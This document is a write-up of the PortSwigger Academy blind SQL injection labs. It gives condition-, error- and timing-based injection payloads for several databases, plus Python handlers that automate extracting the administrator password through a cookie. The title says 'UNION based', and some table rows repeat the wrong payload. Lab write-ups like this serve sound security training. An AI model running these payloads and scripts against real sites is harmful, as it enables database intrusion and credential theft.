# PortSwigger Academy UNION based SQL injection

## Overview

The blind SQL injection labs are intended to be attacked using PortSwigger Burp. They can all be solved using Burp alone however it is a laborious task to solve all the blind SQL labs with Burp alone.

I started out using Burp to get an understanding of blind SQL and then once I understood the domain problem I decided to write some Python code to handle the repetetive nature of the blind SQL data exfiltration. It's important to note that there are various ways to solve these labs without writing any code. The first manual approach is to capture the request and send it to Repeater. The Repeater can be used to inject the SQL, send request and verify the resonse. Additionally and better you can semi automate the attack using Burp Intruder. Semi meaning you can automate the process to extract each character but you'd still need to manually rerun the attack against each position to eventually extract all the characters. Burp Intruder is great and I will learn more about it in other labs but not in this one as I really want to dig into automating the attack using Python.

With that in mind, I created the `bsqli` Python module (library) to provide the ability to create HTTP request objects and inject SQL prior to dispatch. The module also provides linear and binary search functionality.

These labs will cover 3 types of blind SQL injection attacks - condition based, error based and timing based.

### Condition based

With condition based attacks we are using the result of conditional statements to determine the state/value of database records. For example we can infer the values in a database record one character at a time by making certain conditional queries using injected SQL such as: is character 1 in user "adminstrator" password field equal to 'm'.

`' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`

Clearly this is potentially a long process if we have to iterate over all the posible values for each character but it serves to demonstrate how it can be achieved.

### Error based

With error based attacks it is essentially the same as with condition based attacks except that we are inferring the value of the data based on a deliberately induced error condition to infer the data. There could be several reasons why you choose error based over condition based including but not limited to the application not responding as required for condition based queries.

So here we are still going to be using the `SUBSTRING` (or DB specific variant) database function but we additionally need to inject SQL to induce the error we will be testing for:

```python
sql_main_conditional = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm"
error_sql_inj = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
```
In this example we are constructing an sql injection string which utilises SQL `SELECT CASE WHEN` conditional statement (this is database specific - see [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)). When our (original) `SUBSTRING` statement is Thruthy then an error is induced (divide by zero operation) and an error is handled by the application. This can take different forms depending on how the application handles errors, however for the error based attack to be successful then the application must behave differently when an error occurs. 

### Timing based

With timing based attacks it is essentially the same as the condition based attacks but instead of the application providing different content (such as "Welcome back" message), the HTTP request will pause for a specified period of time before sending the HTTP response under define conditions.

```python
timeout = 10 # seconds
sql_main_conditional = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm"
error_sql_inj = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN dbms_pipe.receive_message(('a'),{timeout}) ELSE 'a' END FROM dual)='a`"
```

In this example we're utilising the Oracle `dbms_pipe.receive_message` sleep (among other things) function (database specific - see [Learning path](https://portswigger.net/web-security/sql-injection)) to induce a wait when the main condition is Truthy. Note this example is for an Oracle DB and therefore we are adding the `FROM dual` as Oracle enforces that all `SELECT` statements must have a valid `FROM` clause.

### PreReq

The blind SQL labs require the use of Burp proxy ( or OWASP Zap if you prefer) therfore in prepartion start Burp and configure you browser of choose (I use Firefox for proxying + Foxy Proxy extension) to proxy HTTP traffic through the Burp proxy port.

## Blind SQL injection with conditional responses

See [Condition based](#condition-based) description for more details.

>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
>
>The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
>
>To solve the lab, log in as the administrator user.

__Investigation and proving assumptions__

First thing to do is to track down the `TrackingId` cookie as stated in the lab overview. This can be found by clicking on the "All" link in the "Refine your search" section of the page. Then go to Burp and find the request in the Proxy HTTP History tab. In the Raw pane you will find the Request body including the `TrackingId` cookie.

So what do we know so far?

1. we know that the vulnerability is present in the `TrackingId` cookie in the Request body
1. We know we can modify that value in Burp by either intercepting the request or by sending the request to the Repeater tool in Burp
1. We know that the application responds with a "Welcome back" message if the query returns any rows, but nothing else is visible in the page
1. We know that there is a `users` Table with `username` and `password` columns containing and the table contains a row of data for the `administrator` user
1. We know the password field contains lowercase alphanumeric values only

We have to start somewhere so let's start by prooving our assumptions (above). If we inject `' AND '1' = '1` into the `TrackingId` cookie we would expect the page to display the "Welcome back" message. Note: if you intercept the request and inject the SQL then the response will be displayed in the web page. If you send the request to the Repeater then the response will be displayed in the Repeater tool. I'll be using the Repeater tool for this.

Using Burp Repeater: find the request, right click and select "Send to Repeater". Go to the Repeater tab and insert our SQL into the `TrackingId` field right before the semi-colon, then click send.

`' AND '1' = '1`

We have verified the "Welcome back" message appears in the HTML reponse body so we are now happy we can inject SQL into the cookie and get the expected response. Now to be thourough change the SQL to `' AND '1' = '2` and verify that the "Welcome back" message is no longer returned.

Next lets extend the SQL to verify we can return the "adminstrator" record from the users Table.

``' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'``

Next, using the technique descriped in the SQL [Learning path](https://portswigger.net/web-security/sql-injection), we construct an SQL statement to interogate the users Table.

|Action|SQL injection|Expected|Result|Meaning|
|:-----|:------------|:------|:------|:------|
|Read administrator record|``' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'``|"Welcome back" message|"Welcome back" message|successfully returned admistrator record|
|Verify char 1 is equal to 'm' (guess first letter)|`' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`|Depends what the first char actually is!|No message|First letter is not eqal to 'm'|
|Verify char 1 is less than 'm'|`' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`|Depends what the first char actually is!|Welcome back" message|First character is less than 'm'|
|Verify char 1 is equal to 'b' (guess first letter)|`' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`|Depends what the first char actually is!|Welcome back" message|First character is 'b'|

There were more than 3 attempts to determine what the first character is however the above 3 examples show a type of binary search you could use to reduce the amount of guesses you'd need to make.

This is the point when I decided to write some supporting Python code and created the `bsqli` module - I'm lazy and don't want to spend so much time clicking around an application when I can write some code to do it for me!

`bsqli` Python module provides the class `SqliHttpRequest` with an inject `method` and a (HTTP) `get` method. It also provides `binary_search` and a `linear_search` set of methods to support the blind exfiltration of data using similar methods described above.

To make use of `bsqli` module you still need to write some basic Python code which I'll describe below:

__HTTP Request handler__

This method allows you to define your request including the injected SQL code.

method definition: handler(char: str, op: str, pos: int) -> bool

Arguments:

|Arg|Type|Description|
|:--|:---|:----------|
|char|str|the character (or string) you want to check the condition against|
|op|str|conditional operator (typically but limited to '<' or '=')|
|pos|int|the position of the character you want to check - like an array index|
|return|boolean|the handler function must return True or False to the `bsqli` search function|

We need to perform 2 actions:

1. Determine the password length
1. Determine each character of the password sequentially

__Determine administrator password length__

The following handler function is used to determine the number of characters in the password. It utilises the database `LENGTH` function for and tests it against a given number (val)

```python
def password_size_handler(val, op, pos):
  sql_passwd_inj = "' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) {} '{}".format(op, val)
  req.inject('cookie', 'TrackingId', sql_passwd_inj)
  resp = req.get()
  if resp.status_code != 200:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return truthy_response(resp.content, 'Welcome')
```

__Determine the administrator password character string__

The following handler function is used to determine the value (val) of a given (pos) character in the password.

```python
def password_search_handler(val, op, pos):
  sql_passwd_inj = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) {} '{}".format(pos, op, val)
  req.inject('cookie', 'TrackingId', sql_passwd_inj)
  resp = req.get()
  if resp.status_code != 200:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return truthy_response(resp.content, 'Welcome')
```
Note: the handler methods return True if "Welcome" string is in the HTTP resp body, else False

Now the code to iterate over each character in the password and determine it's value based on a conditional SQL injection

```python
import helper
from bsqli import SqliHttpRequest
from bsqli import binary_search
from bsqli import linear_search

# create the reference data-set
def prepare_lc_alphanumeric_data():
  return list(map(str, range(0,10))) + list(string.ascii_lowercase)

if __name__ == "__main__":
  signal.signal(signal.SIGINT, interrupt_handler)
  verbose, target, cookies = helper.args()
  data = helper.prepare_lc_alphanumeric_data()

  # create bsqli request object
  req = SqliHttpRequest(target, headers, cookies)
  print("extracting password length...")
  password_len = linear_search(list(range(0, 30)), password_size_handler, 1)

  # exit if unable to retrieve password length
  if not password_len or password_len == 0:
    print('ERROR: failed to retrieve password lenght!')
    exit(1)

  print(f"password length: {password_len}")
  password = []
  # iterate of each character of the password according to password length
  for pos in range(1,int(password_len)+1):
    password.append(binary_search(data, password_search_handler, pos))
    print('extracting password [%d%%]\r'%(int(pos / password_len * 100)), end="")

  print("\nPassword: {}".format("".join(password)), flush=True)
```

Full source code:

- [scripts/helper.py](scripts/helper.py)
- [scripts/blind_sqli_cond_resp.py](scripts/blind_sqli_cond_resp.py)

## Blind SQL injection with error conditional response

See [Error condition](#error-based) description for more details.

There are 2 changes to the [condition based](#blind-sql-injection-with-conditional-responses) approach that need to be discussed.

First, create the error conditional SQL statement that includes the original condition based SQL statement:

[scripts/helper.py](scripts/helper.py)

```python
def sqli_cond_error(sql_main_conditional, db_type):
  # sql error condition: https://portswigger.net/web-security/sql-injection/cheat-sheet
  sql = None
  if db_type == 'Oracle':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
  elif db_type == 'Microsoft':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN 1/0 ELSE NULL END)='a"
  elif db_type == 'PostgreSQL':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN 1/(SELECT 0) ELSE NULL END)='a"
  elif db_type == 'MySQL':
    sql = f"SELECT IF({sql_main_conditional},(SELECT table_name FROM information_schema.tables),'a')"

  return sql
```

Second, create 2 new handlers that utilise error conditions (injection code and error based conditional statement):

```python
def password_size_handler(val, op, pos):
  sql_passwd_inj = "LENGTH((SELECT password FROM users WHERE username = 'administrator')) {} '{}'".format(op, val)
  sql = helper.sqli_cond_error(sql_passwd_inj, 'Oracle')
  req.inject('cookie', 'TrackingId', sql)

  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return resp.status_code == 500

def password_search_handler(val, op, pos):
  sql_passwd_inj = "SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {}, 1) {} '{}'".format(pos, op, val)
  sql = helper.sqli_cond_error(sql_passwd_inj, 'Oracle')
  req.inject('cookie', 'TrackingId', sql)
  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return resp.status_code == 500
```

Note: the handler methods return True is HTTP error code 500 is returned. This is how the lab application responds to the induced error condition (other applications may respond differently)

Note: _the __\_\_main\_\___ code incorporating the password length and character iteration logic remains the same_

Full source code:

- [scripts/helper.py](scripts/helper.py)
- [scripts/blind_sqli_cond_error.py](scripts/blind_sqli_cond_error.py)

## Blind SQL injection with timer conditional response

See [Timing condition](#timing-based) description for more details.

[scripts/helper.py](scripts/helper.py)

First, create the timing conditional SQL statement that includes the original condition based SQL statement:

```python
def sqli_cond_timeout(sql_main_conditional, db_type, timeout):
  sql = None
  if db_type == 'Oracle':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN dbms_pipe.receive_message(('a'),{timeout}) ELSE 'a' END FROM dual)='a"
  elif db_type == 'Microsoft':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN WAITFOR DELAY '0:0:{timeout}' ELSE 'a' END)='a"
  elif db_type == 'PostgreSQL':
    # note - needed to do string concatentation to get the pg_sleep call to work 'a'||pg_sleep(10)
    # base command: "' AND (SELECT 'a'||pg_sleep(2)) = 'a"
    sql = f"' AND 'a' = (SELECT CASE WHEN ({sql_main_conditional}) THEN 'a'||pg_sleep({timeout}) ELSE 'b'||pg_sleep(0) END)--"
  elif db_type == 'MySQL':
    sql = f"SELECT IF({sql_main_conditional},(SELECT SLEEP({timeout})),'a')"

  return sql
```

Second, create 2 new handlers that utilise timing conditions (injection code and timing based conditional statement):

```python
TIMEOUT = 5

def password_size_handler(val, op, pos):
  sql_passwd_inj = "LENGTH((SELECT password FROM users WHERE username = 'administrator')) {} '{}'".format(op, val)
  sql = helper.sqli_cond_timeout(sql_passwd_inj, 'PostgreSQL', TIMEOUT)
  req.inject('cookie', 'TrackingId', sql)
  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  success = resp.elapsed.seconds in range(TIMEOUT - 2, TIMEOUT + 2)
  
  return success

def password_search_handler(val, op, pos):
  sql_passwd_inj = "SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {}, 1) {} '{}'".format(pos, op, val)
  sql = helper.sqli_cond_timeout(sql_passwd_inj, 'PostgreSQL', TIMEOUT)
  req.inject('cookie', 'TrackingId', sql)
  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  success = resp.elapsed.seconds in range(TIMEOUT - 2, TIMEOUT + 2)
  
  return success
```

Note: _the __\_\_main\_\___ code incorporating the password length and character iteration logic remains the same_

Full source code:

- [scripts/helper.py](scripts/helper.py)
- [scripts/blind_sqli_cond_timeout.py](scripts/blind_sqli_cond_timeout.py)
